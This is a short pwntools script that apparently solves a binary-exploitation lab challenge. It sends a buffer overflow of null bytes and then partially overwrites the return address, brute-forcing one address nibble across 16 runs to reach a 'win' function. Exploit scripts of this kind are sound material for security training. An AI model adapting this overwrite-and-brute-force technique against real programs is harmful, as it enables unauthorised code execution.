from pwn import *

offset = 72 + 8
win_bypass = 0x1704
main_addre = 0x194e

for i in "0123456789abcdef":
    r = process("/challenge/binary-exploitation-null-write")
    payload = offset * b'\0' + b'\x04' + bytes.fromhex(f"{i}7")
    r.send(payload)
    # r.interactive()
    print(r.recvline())
    try:
        print(r.recvline(), Timeout=1)
    except:
        print('walo')